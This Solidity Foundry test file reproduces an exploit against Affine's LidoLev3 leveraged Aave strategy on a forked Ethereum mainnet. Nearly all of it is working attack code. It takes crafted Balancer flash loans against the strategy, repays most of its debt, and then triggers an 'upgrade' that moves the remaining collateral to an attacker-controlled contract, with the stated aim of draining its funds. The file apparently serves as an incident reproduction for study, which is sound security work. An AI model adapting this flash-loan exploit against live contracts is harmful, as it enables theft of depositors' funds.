//SPDX-License-Identifier:MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import {ICheatCodes} from "../src/interfaces/ICheatCodes.sol";
import {IBalancer} from "../src/interfaces/IBalancer.sol";
import {IFlashLoanRecipient} from "../src/interfaces/IFlashLoanRecipient.sol";

import {IERC20} from "../src/interfaces/IERC20.sol";
import {IWETH} from "../src/interfaces/IWETH.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

/**
 * @title Affine Attack
 * @author 0Kage 17-Feb-24
 * @notice a detailed explanation of this attack can be found in my article here:  
 */
contract AffineExploit0224 is Test {

    address constant BALANCER = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant LIDOLEV3 = 0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142;
    address constant WETH= 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    ERC20 aToken; // collateral token (deposited into aave)
    ERC20 debtToken; // debt token for collateral (borrowed against deposit)

    ICheatCodes cheats = ICheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D); 


    //@note LidoLev3 is a leveraged Aave Borrowing strategy on Lido Eth
    //@note For every 1 WETH transferred to strategy, strategy leverages 10X via flash loans
    //@note 10 WETH is converted to 10 wStETH, which is then deposited into Aave to get 10 aETHsWETH
    //@note Against this collateral, 9 WETH is borrowed from Aave and total 10 WETH (1 WETH deposit + 9 WETH) borrowing
    //@note is used to repay the flash loan. Effectively strategy provides interest on leveraged investment
    function setUp() external {
        // 1. create mainnet fork
        string memory mainnetRPC = cheats.envString("MAINNET_RPC_URL");
        uint256 mainnetForkId = cheats.createFork(mainnetRPC, 19_132_195 - 1);
        cheats.selectFork(mainnetForkId);

        // 2. get aToken  (collateral for this strategy)
        (bool success, bytes memory result) = LIDOLEV3.call(abi.encodeWithSignature("aToken()") );
        require(success, "could not retrieve atoken");
        (aToken) = abi.decode(result, (ERC20));
        emit log_named_address("aSteEthWeth address", address(aToken));

        //3. get debt token (aave debt token for this aToken)
        (bool successAgain, bytes memory otherResult) = LIDOLEV3.call(abi.encodeWithSignature("debtToken()"));
        require(successAgain, "could not retrieve debt token");
        (debtToken) = abi.decode(otherResult, (ERC20));
        emit log_named_address("aave debt token address", address(debtToken));
    }
    
    //@note objective is to drain all funds from this wallet
    function test_affine_exploit() external {
        uint256 collateralBalance = aToken.balanceOf(LIDOLEV3);
        uint256 debtOutstanding = debtToken.balanceOf(LIDOLEV3);
        emit log_named_string("Before Attack:", "****************************************************");
        emit log_named_uint("aSteEthWeth balance (collateral) for this strategy before attack", collateralBalance);
        emit log_named_uint("debt token balance (outstanding) for this strategy before attack", debtOutstanding);        
        emit log_named_uint("aSteEthWeth balance of attacker before attack:", aToken.balanceOf(address(this)));

        //@note LidoLev3 is a max leverage strategy -> if you check debt, you will note 90% of collateral is monetized via debt
        //@note 90% collateralization is because there is e-mode supported by Aave that allows this
        //@note for the curious few -> e-mode is high capital efficiency mode, read more here: https://docs.aave.com/faq/aave-v3-features


        //4 take a flash loan from balancer for the outstanding debt amount to pay outstanding debt
        //@note considering above dynamics, we try to repay 90% of outstanding debt (say debt = D, repay 0.9*D)
        //@note collateral that would be freed would have value of (100*(0.9*D)/90 = D)
        //@note in effect, after paying back flash loan, strategy will have enough WETh from redeemed collateral to pay out entire debt outstanding
        //@note balance aToken collateral will be still left in the strategy by the end of this step

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = debtOutstanding * 90 / 100; //@note 90% of outstanding debt is being repaid
        bytes memory data = abi.encode(1, address(0)); 
        //@note 1 here represents LoanType of "divest" -> ie. repay debt and withdraw from aave 
        //@note address(0) -> new strategy address -> not relevant for this, hence passing address(0)
        

        //@note in this step, we are basically sending flash loan to LIDOLEV3 strategy to closePosition that does following:
        //1. repay 90% of debt in WETH to AAVE
        //2. Proportionate wStETH token is freed for redemption
        //3. Withdraw wSteETH collateral and convert wStETH -> stETH -> WETH
        //4. pay a portion of WETH towards flash loan repayment 
        
        IBalancer(BALANCER).flashLoan(IFlashLoanRecipient(LIDOLEV3), tokens, amounts, data);
        emit log_named_string("************************************************Repay 90% of strategy debt with flash loan:", "****************************************************");
        //verify that debt balance of LIDOLEV3 is 10% of outstanding
        assertTrue(abs(debtToken.balanceOf(LIDOLEV3), debtOutstanding * 10 / 100) <= 1, "incorrect debt balance after flash loan repay");
        // @note rounding effect handled by this hack

        // verify that 10% of aToken (collateral) is still in the strategy
        uint256 aTokenBalanceAfterRepay =  aToken.balanceOf(LIDOLEV3);
        assertTrue(abs(aTokenBalanceAfterRepay, collateralBalance * 10 /100) <= 1, "incorrect collateral balance after flash loan repay");
        emit log_named_uint("debt token balance in lido lev3 after repay is 10% of earlier value", debtToken.balanceOf(LIDOLEV3));
        emit log_named_uint("aSteEthWeth balance  in lido lev3 after repay is 10% of earlier value", aTokenBalanceAfterRepay);

        //@note by this step, we should have balance collateral still in the strategy        

        //5 Now take another dummy flash loan and push an action to upgrade the strategy to a new address (this address)
        //@note when strategy is updated, the new strategy addy is passed as bytes data
        //@note upgrade pays back outstanding debt in strategy -> WETH balance in strategy will be enough to pay back this debt without further redeeming collateral

        //@note upgrade then transfers all collateral and debt outstanding from the old to new strategy
        //@note since we already noted that aSteEthWeth balance exists in lidolev3, all of it will be transferred to the new strategy address, controlled by attacker

        uint256[] memory amountsNew = new uint256[](1);
        amountsNew[0] = 0;

        bytes memory newData = abi.encode(2, address(this)); //@note attacker sets new strategy to this contract
        //@note 2 here represents the "upgrade" LoanType    
        emit log_named_string("************************************************Upgrade to new strategy via flash loan:", "****************************************************");
        IBalancer(BALANCER).flashLoan(IFlashLoanRecipient(LIDOLEV3), tokens, amountsNew, newData );

        //@note at this point all debt of LidoLev3 should be paid off
        assertEq(debtToken.balanceOf(LIDOLEV3), 0, "incorrect debt balance after flash loan upgrade"); 

        // verify that aToken balance has increased after attack & that aToken balance of LIDOLEV3 is 0
        assertEq(aToken.balanceOf(LIDOLEV3), 0, "incorrect WETH balance in Strategy after attack");
        assertEq(aToken.balanceOf(address(this)), aTokenBalanceAfterRepay, "attack failed");

        emit log_named_uint("aSteEthWeth balance of attacker after attack:", aToken.balanceOf(address(this)));   
        emit log_named_uint("aSteEthWeth of Lido Lev3 Strategy after attack:", aToken.balanceOf(LIDOLEV3));
    }

    function createAaveDebt(uint256 wethAmount) external {
        // do nothing
    }

    // absolute value
    function abs(uint256 left, uint256 right) private pure returns (uint256){
        if(left >= right){
            return left - right;
        }
        else{
            return right - left;
        }
    }
}